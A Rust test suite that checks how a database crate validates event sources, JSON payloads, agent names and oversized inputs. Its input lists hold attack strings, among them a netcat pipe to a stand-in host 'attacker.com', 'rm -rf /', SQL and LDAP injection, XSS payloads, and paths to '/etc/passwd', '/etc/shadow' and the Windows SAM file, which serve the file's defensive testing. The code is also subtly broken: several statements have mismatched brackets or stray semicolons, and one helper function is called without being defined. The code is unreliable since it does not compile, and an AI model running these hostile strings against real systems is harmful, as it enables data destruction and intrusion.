use anyhow::Result;
use std::time::Duration;
use tokio::time::timeout;
use sinex_db::{create_test_pool, run_migrations, queries::insert_raw_event};
use sinex_ulid::Ulid;
use serde_json::json;

/// Test input validation for event sources and types
#[tokio::test]
async fn test_event_source_validation() -> Result<()> {
    let pool = get_shared_test_pool().await?;
    run_migrations(&pool).await?;

    // Test various malicious source names
    let long_string_1000 = "A".repeat(1000);
    let long_string_10000 = "A".repeat(10000);
    
    let malicious_sources = vec![
        // Control characters and null bytes
        "test\x00source",
        "test\rsource",
        "test\nsource", 
        "test\tsource",
        "\x01\x02\x03source",
        
        // Unicode attacks
        "test\u{200B}source",  // Zero-width space
        "test\u{FEFF}source",  // Byte order mark
        "test\u{202E}source",  // Right-to-left override
        "test\u{FFFF}source",  // Replacement character
        
        // Path-like strings
        "../../../etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "/proc/self/environ",
        "\\\\server\\share\\file",
        
        // SQL-like strings  
        "'; DROP TABLE events; --",
        "source' OR '1'='1",
        "test UNION SELECT * FROM users",
        
        // Command injection patterns
        "test; rm -rf /",
        "test && echo 'pwned'",
        "test | nc attacker.com 1337",
        "test `whoami`",
        "test $(id)",
        
        // Script injection
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "vbscript:msgbox('xss')",
        
        // Format string attacks
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n%n%n%n%n%n%n",
        "%x%x%x%x%x%x%x%x%x%x",
        
        // LDAP injection
        "test)(uid=*))(|(uid=*",
        "*)(uid=*))(|(uid=*",
        
        // Very long strings
        &long_string_1000,
        &long_string_10000,
        
        // Empty and whitespace
        "",
        " ",
        "\t",
        "\n",
        "   \t\n   ",
        
        // Special characters
        "test!@#$%^&*()_+-={}[]|\\:;\"'<>?,./~`",
    ];

    let mut validation_results = Vec::new();

    for (i, malicious_source) in malicious_sources.iter().enumerate() {
        let test_event = insert_raw_event(
            &pool,
            malicious_source,
            "validation_test",
            "localhost", 
            json!({"test": i}),
            None,
            Some("1.0.0"),
            None,
        ).await;

        match test_event {
            Ok(event) => {
                // Check what was actually stored
                let stored_source: String = sqlx::query_scalar!(
                    "SELECT source FROM raw.events WHERE id = $1::uuid::ulid",
                    event.id.to_uuid()
                )
                .fetch_one(&pool)
                .await?;

                let validation_result = ValidationResult {
                    input: malicious_source.to_string(),
                    stored: stored_source.clone(),
                    accepted: true,
                    sanitized: stored_source != *malicious_source,
                };

                validation_results.push(validation_result);

                // Check for dangerous patterns that made it through
                if stored_source.contains("DROP TABLE") || 
                   stored_source.contains("/etc/passwd") ||
                   stored_source.contains("<script>") {
                    println!("  WARNING: Dangerous content stored: {}", stored_source);
                }
            }
            Err(e) => {
                validation_results.push(ValidationResult {
                    input: malicious_source.to_string(),
                    stored: String::new(),
                    accepted: false,
                    sanitized: false,
                });
                println!("  Input {} rejected: {}", i, e);
            }
        }
    }

    // Analyze validation results
    let accepted_count = validation_results.iter().filter(|r| r.accepted).count();
    let sanitized_count = validation_results.iter().filter(|r| r.sanitized).count();
    let dangerous_accepted = validation_results.iter()
        .filter(|r| r.accepted && (
            r.stored.contains("DROP") ||
            r.stored.contains("/etc/") ||
            r.stored.contains("<script>") ||
            r.stored.contains("\x00")
        ))
        .count();

    println!("\nEvent Source Validation Results:");
    println!("  Total malicious inputs: {}", malicious_sources.len());
    println!("  Inputs accepted: {}", accepted_count);
    println!("  Inputs sanitized: {}", sanitized_count);
    println!("  Dangerous inputs accepted: {}", dangerous_accepted);

    // Good validation should either reject dangerous inputs or sanitize them
    if dangerous_accepted > 0 {
        println!("  WARNING: {} dangerous inputs were accepted without sanitization", dangerous_accepted);
        
        for result in validation_results.iter().filter(|r| 
            r.accepted && !r.sanitized && (
                r.input.contains("DROP") || 
                r.input.contains("/etc/") ||
                r.input.contains("<script>")
            )
        ) {
            println!("    Dangerous: '{}' -> '{}'", result.input, result.stored);
        }
    } else {
        println!("  ✓ No dangerous inputs accepted without sanitization");
    }

    // Cleanup
    sqlx::query!("DELETE FROM raw.events WHERE event_type = 'validation_test'")
        .execute(&pool).await.ok();

    Ok(())
}

#[derive(Debug)]
struct ValidationResult {
    input: String,
    stored: String,
    accepted: bool,
    sanitized: bool,
}

/// Test JSON payload validation and sanitization
#[tokio::test]
async fn test_json_payload_validation() -> Result<()> {
    let pool = get_shared_test_pool().await?;
    run_migrations(&pool).await?;

    // Test various malicious JSON structures
    let malicious_payloads = vec![
        // Deeply nested objects (JSON bomb)
        create_nested_json(50),
        
        // Very wide objects (many keys)
        create_wide_json(1000),
        
        // Large string values
        json!({"large_string": "X".repeat(1_000_000)}),
        
        // Large arrays
        json!({"large_array": (0..100_000).collect::<Vec<i32>>()}),
        
        // Prototype pollution attempts
        json!({
            "__proto__": {"admin": true},
            "constructor": {"prototype": {"isAdmin": true}},
            "prototype": {"admin": true}
        }),
        
        // Unicode and encoding attacks
        json!({
            "unicode_attack": "\u{0000}\u{0001}\u{0002}",
            "overlong_utf8": "\u{FEFF}\u{200B}",
            "rtl_override": "\u{202E}malicious\u{202D}",
            "replacement_char": "\u{FFFD}"
        }),
        
        // SQL injection in JSON values
        json!({
            "sql_injection": "'; DROP TABLE events; --",
            "union_attack": "' UNION SELECT * FROM agent_manifests --",
            "boolean_injection": "' OR '1'='1' --"
        }),
        
        // XSS in JSON values
        json!({
            "xss_script": "<script>alert('xss')</script>",
            "xss_img": "<img src=x onerror=alert('xss')>",
            "xss_javascript": "javascript:alert('xss')"
        }),
        
        // Command injection
        json!({
            "command_injection": "; rm -rf /",
            "backtick_injection": "`whoami`",
            "dollar_injection": "$(id)",
            "pipe_injection": "| nc attacker.com 1337"
        }),
        
        // Path traversal
        json!({
            "path_traversal": "../../../etc/passwd",
            "windows_path": "..\\..\\..\\windows\\system32\\config\\sam",
            "absolute_path": "/etc/shadow"
        }),
        
        // Binary data in JSON
        json!({
            "binary_data": serde_json::Value::String(
                (0..256).map(|i| char::from(i as u8)).collect()
            )
        }),
    ];

    let mut payload_results = Vec::new();

    for (i, malicious_payload) in malicious_payloads.iter().enumerate() {
        println!("Testing malicious payload {}/{}", i + 1, malicious_payloads.len());

        // Test insertion with timeout to prevent hangs
        let insert_result = timeout(
            Duration::from_secs(3),
            insert_raw_event(
                &pool,
                "payload.validation",
                "malicious_json",
                "localhost",
                malicious_payload.clone(),
                None,
                Some("1.0.0"),
                None,
            )
        ).await;

        match insert_result {
            Ok(Ok(event)) => {
                // Retrieve and analyze stored payload
                let stored_payload: serde_json::Value = sqlx::query_scalar!(
                    "SELECT payload FROM raw.events WHERE id = $1::uuid::ulid",
                    event.id.to_uuid()
                )
                .fetch_one(&pool)
                .await?;

                let original_str = malicious_payload.to_string());
                let stored_str = stored_payload.to_string());
                
                let payload_result = PayloadValidationResult {
                    test_case: i,
                    original_size: original_str.len(),
                    stored_size: stored_str.len(),
                    accepted: true,
                    modified: original_str != stored_str,
                    contains_dangerous: check_dangerous_content(&stored_str),
                };

                payload_results.push(payload_result);
            }
            Ok(Err(e)) => {
                println!("  Payload {} rejected: {}", i, e);
                payload_results.push(PayloadValidationResult {
                    test_case: i,
                    original_size: malicious_payload.to_string().len(),
                    stored_size: 0,
                    accepted: false,
                    modified: false,
                    contains_dangerous: false,
                });
            }
            Err(_) => {
                println!("  Payload {} timed out (protection active)", i);
                payload_results.push(PayloadValidationResult {
                    test_case: i,
                    original_size: malicious_payload.to_string().len(),
                    stored_size: 0,
                    accepted: false,
                    modified: false,
                    contains_dangerous: false,
                });
            }
        }
    }

    // Analyze results
    let accepted_payloads = payload_results.iter().filter(|r| r.accepted).count();
    let modified_payloads = payload_results.iter().filter(|r| r.modified).count();
    let dangerous_stored = payload_results.iter().filter(|r| r.contains_dangerous).count();
    let large_payloads_accepted = payload_results.iter()
        .filter(|r| r.accepted && r.original_size > 100_000)
        .count();

    println!("\nJSON Payload Validation Results:");
    println!("  Total malicious payloads: {}", malicious_payloads.len());
    println!("  Payloads accepted: {}", accepted_payloads);
    println!("  Payloads modified/sanitized: {}", modified_payloads);
    println!("  Dangerous content stored: {}", dangerous_stored);
    println!("  Large payloads accepted: {}", large_payloads_accepted);

    // Security assessment
    if dangerous_stored > 0 {
        println!("  WARNING: {} payloads with dangerous content were stored", dangerous_stored);
    } else {
        println!("  ✓ No dangerous payload content stored");
    }

    if large_payloads_accepted > 5 {
        println!("  WARNING: Large payloads may cause resource exhaustion");
    } else {
        println!("  ✓ Large payload protection active");
    }

    // Cleanup
    sqlx::query!("DELETE FROM raw.events WHERE source = 'payload.validation'")
        .execute(&pool).await.ok();

    Ok(())
}

#[derive(Debug)]
struct PayloadValidationResult {
    test_case: usize,
    original_size: usize,
    stored_size: usize,
    accepted: bool,
    modified: bool,
    contains_dangerous: bool,
}

fn create_nested_json(depth: usize) -> serde_json::Value {
    if depth == 0 {
        json!("deep_value")
    } else {
        json!({
            "level": depth,
            "nested": create_nested_json(depth - 1)
        })
    }
}

fn create_wide_json(width: usize) -> serde_json::Value {
    let mut object = serde_json::Map::new();
    for i in 0..width {
        object.insert(format!("key_{}", i), json!(format!("value_{}", i)));
    }
    serde_json::Value::Object(object)
}

fn check_dangerous_content(content: &str) -> bool {
    content.contains("DROP TABLE") ||
    content.contains("<script>") ||
    content.contains("/etc/passwd") ||
    content.contains("rm -rf") ||
    content.contains("__proto__") ||
    content.contains("\x00") ||
    content.contains("javascript:")
}

/// Test error handling for malformed inputs
#[tokio::test]
async fn test_malformed_input_handling() -> Result<()> {
    let pool = get_shared_test_pool().await?;
    run_migrations(&pool).await?;

    // Test agent creation with malformed names
    let long_agent_name = "a".repeat(1000);
    
    let malformed_agent_names = vec![
        "", // Empty
        " ", // Whitespace only
        "\t\n\r", // Whitespace characters
        "\x00invalid", // Null byte
        "agent\x00name", // Embedded null
        "agent\nname", // Newline
        "agent\rname", // Carriage return
        &long_agent_name, // Too long
        "invalid/agent", // Path separator
        "invalid\\agent", // Windows path separator
        "invalid;agent", // Command separator
        "invalid|agent", // Pipe
        "invalid&agent", // Ampersand
        "invalid`agent", // Backtick
        "invalid$agent", // Dollar
        "invalid(agent)", // Parentheses
        "invalid{agent}", // Braces
        "invalid[agent]", // Brackets
        "invalid<agent>", // Angle brackets
        "invalid\"agent\"", // Quotes
        "invalid'agent'", // Single quotes
    ];

    let mut agent_validation_results = Vec::new();

    for malformed_name in malformed_agent_names {
        let agent_creation = sqlx::query!(
            "INSERT INTO sinex_schemas.agent_manifests (agent_name, version, description) 
             VALUES ($1, $2, $3)",
            malformed_name,
            "1.0.0",
            "Malformed name test"
        )
        .execute(&pool)
        .await;

        match agent_creation {
            Ok(_) => {
                agent_validation_results.push((malformed_name.clone(), true));
                
                // Clean up immediately
                sqlx::query!(
                    "DELETE FROM sinex_schemas.agent_manifests WHERE agent_name = $1",
                    malformed_name
                )
                .execute(&pool)
                .await
                .ok();
            }
            Err(e) => {
                agent_validation_results.push((malformed_name.clone(), false));
                println!("  Malformed agent name '{}' rejected: {}", 
                        malformed_name.chars().take(20).collect::<String>(), e);
            }
        }
    }

    // Test work queue operations with malformed data
    let valid_agent = format!("test_agent_{}", Ulid::new());
    sqlx::query!(
        "INSERT INTO sinex_schemas.agent_manifests (agent_name, version, description) 
         VALUES ($1, $2, $3)",
        valid_agent,
        "1.0.0",
        "Valid test agent"
    )
    .execute(&pool)
    .await?;

    // Test malformed event creation
    let malformed_events = vec!{
        ("", "empty_source", "localhost", json!({});
        ("test", "", "localhost", json!({})), // Empty event type
        ("test", "type", "", json!({})), // Empty host
        ("test", "type", "localhost", serde_json::Value::Null), // Null payload
    };

    let mut event_validation_results = Vec::new();

    for (source, event_type, host, payload) in malformed_events {
        let event_result = insert_raw_event(
            &pool,
            source,
            event_type,
            host,
            payload,
            None,
            Some("1.0.0"),
            None,
        ).await;

        match event_result {
            Ok(_) => {
                event_validation_results.push((source.to_string(), true));
            }
            Err(e) => {
                event_validation_results.push((source.to_string(), false));
                println!("  Malformed event rejected: {}", e);
            }
        }
    }

    println!("\nMalformed Input Handling Results:");
    
    let accepted_agents = agent_validation_results.iter().filter(|(_, accepted)| *accepted).count();
    println!("  Malformed agent names: {}/{} accepted", 
             accepted_agents, agent_validation_results.len());
    
    let accepted_events = event_validation_results.iter().filter(|(_, accepted)| *accepted).count();
    println!("  Malformed events: {}/{} accepted", 
             accepted_events, event_validation_results.len());

    // Show which malformed inputs were accepted
    for (name, accepted) in &agent_validation_results {
        if *accepted {
            println!("  WARNING: Malformed agent name accepted: '{}'", 
                    name.chars().take(50).collect::<String>());
        }
    }

    for (source, accepted) in &event_validation_results {
        if *accepted {
            println!("  WARNING: Malformed event accepted: source='{}'", source);
        }
    }

    // Cleanup
    sqlx::query!("DELETE FROM sinex_schemas.agent_manifests WHERE agent_name = $1", valid_agent)
        .execute(&pool).await?;
    sqlx::query!("DELETE FROM raw.events WHERE source IN ('', 'test')")
        .execute(&pool).await.ok();

    Ok(())
}

/// Test boundary conditions and edge cases
#[tokio::test]
async fn test_input_boundary_conditions() -> Result<()> {
    let pool = get_shared_test_pool().await?;
    run_migrations(&pool).await?;

    // Test size boundaries
    let normal_string = "a".repeat(100);
    let large_string = "a".repeat(10_000);
    let very_large_string = "a".repeat(100_000);
    let extreme_string = "a".repeat(1_000_000);
    
    let boundary_tests = vec![
        // String length boundaries
        ("single_char", "a"),
        ("normal_length", normal_string.as_str();
        ("large_string", large_string.as_str();
        ("very_large_string", very_large_string.as_str();
        ("extreme_string", extreme_string.as_str();
        
        // Unicode boundaries
        ("unicode_basic", "héllo wörld"),
        ("unicode_emoji", "🚀🔥💯"),
        ("unicode_complex", "مرحبا 你好 🌍"),
        ("unicode_mixed", "ASCII混合текст🌟"),
        
        // Number boundaries (as strings)
        ("number_zero", "0"),
        ("number_negative", "-1"),
        ("number_large", "999999999999999999"),
        ("number_float", "3.14159265359"),
        ("number_scientific", "1.23e-45"),
    ];

    let mut boundary_results = Vec::new();

    for (test_name, test_value) in boundary_tests {
        println!("Testing boundary condition: {} (length: {})", test_name, test_value.len());

        // Test as event source
        let source_result = timeout(
            Duration::from_secs(3),
            insert_raw_event(
                &pool,
                test_value,
                "boundary_test",
                "localhost",
                json!({"test": test_name}),
                None,
                Some("1.0.0"),
                None,
            )
        ).await;

        // Test as JSON payload value
        let payload_result = timeout(
            Duration::from_secs(3),
            insert_raw_event(
                &pool,
                "boundary.test",
                "payload_test", 
                "localhost",
                json!({"boundary_value": test_value}),
                None,
                Some("1.0.0"),
                None,
            )
        ).await;

        let boundary_result = BoundaryTestResult {
            test_name: test_name.to_string(),
            input_size: test_value.len(),
            source_accepted: source_result.is_ok() && source_result.unwrap().is_ok(),
            payload_accepted: payload_result.is_ok() && payload_result.unwrap().is_ok(),
        };

        boundary_results.push(boundary_result);
    }

    // Analyze boundary test results
    let large_inputs_accepted = boundary_results.iter()
        .filter(|r| r.input_size > 50_000 && (r.source_accepted || r.payload_accepted))
        .count();
    
    let extreme_inputs_accepted = boundary_results.iter()
        .filter(|r| r.input_size > 500_000 && (r.source_accepted || r.payload_accepted))
        .count();

    println!("\nInput Boundary Condition Results:");
    println!("  Total boundary tests: {}", boundary_results.len());
    println!("  Large inputs accepted (>50KB): {}", large_inputs_accepted);
    println!("  Extreme inputs accepted (>500KB): {}", extreme_inputs_accepted);

    for result in &boundary_results {
        if result.input_size > 100_000 {
            println!("  {}: {}KB - source:{} payload:{}", 
                    result.test_name, 
                    result.input_size / 1000,
                    if result.source_accepted { "✓" } else { "✗" },
                    if result.payload_accepted { "✓" } else { "✗" });
        }
    }

    if extreme_inputs_accepted > 0 {
        println!("  WARNING: {} extreme size inputs were accepted", extreme_inputs_accepted);
    } else {
        println!("  ✓ Extreme size input protection active");
    }

    // Cleanup
    sqlx::query!("DELETE FROM raw.events WHERE event_type IN ('boundary_test', 'payload_test')")
        .execute(&pool).await.ok();

    Ok(())
}

#[derive(Debug)]
struct BoundaryTestResult {
    test_name: String,
    input_size: usize,
    source_accepted: bool,
    payload_accepted: bool,
}